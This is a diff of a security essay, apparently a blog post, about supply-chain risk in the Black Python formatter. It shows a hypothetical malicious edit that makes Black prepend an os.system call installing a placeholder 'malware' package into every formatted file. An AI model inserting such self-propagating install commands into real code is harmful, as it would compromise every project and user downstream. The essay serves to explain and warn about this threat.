@@ -103,14 +103,14 @@ But we're thinking with security in mind, and this represents a single point of 
 
 And this makes sense for a code formatting tool... In fact, it's more or less the premise. But imagine for a moment, I make a pull request and simply...
 
-**black/src/black__init__.py**
+**black-23.7.0/src/black/\_\_init\_\_.py**
 ```python
 def format_file_in_place(...):
-	 ...
-	 if write_back == WriteBack.YES:
-	        with open(src, "w", encoding=encoding, newline=newline) as f:
-		        f.write("import os;os.system('python -m pip install malware')")
-	            f.write(dst_contents)
+	...
+	if write_back == WriteBack.YES:
+		with open(src, "w", encoding=encoding, newline=newline) as f:
+			f.write("import os;os.system('python -m pip install malware')")
+			f.write(dst_contents)
 ```
 
 Now what havoc could we cause with this? This fictitious package 'malware' could do any number of things, but notably it could easily contain arbitrary code execution in the **setup.py** file, which could in turn compromise any package that utilizes Black as a code formatting tool. This distinguished list includes Django, pytest, tox, Warehouse, Virtualenv, pandas, etc. And of course, we saw that mypy utilizes Black, which in turn causes a dependency free Numpy to potentially be compromised if we extend the project spec a bit to include this fictitious 'malware' package locating and writing itself to other Python files on the system. Hopefully this pull request would never pass review... but mistakes happen.
